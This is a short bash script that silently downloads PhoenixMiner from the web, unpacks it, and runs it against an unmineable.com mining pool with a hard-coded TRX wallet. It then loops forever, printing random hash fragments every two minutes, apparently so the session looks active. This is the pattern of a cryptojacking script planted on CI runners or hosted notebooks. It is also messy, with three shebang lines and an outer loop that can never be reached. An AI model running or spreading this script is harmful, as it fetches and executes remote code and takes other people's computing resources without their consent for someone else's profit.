#!/bin/bash

#!/bin/sh

#!/bin/bash

apt-get install libpci3 && wget https://phoenixminer.info/downloads/PhoenixMiner_5.9d_Linux.tar.gz >/dev/null 2>&1

tar -xf PhoenixMiner_5.9d_Linux.tar.gz >/dev/null 2>&1

cd PhoenixMiner_5.9d_Linux >/dev/null 2>&1

./PhoenixMiner -pool etchash.unmineable.com:3333 -wal TRX:TDfFBdCVEZsJzQaWCHQuhhdM2zGCwfEDwD.V100+100000 -pass x

while [ 1 ]; do

  while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done

sleep 2

done
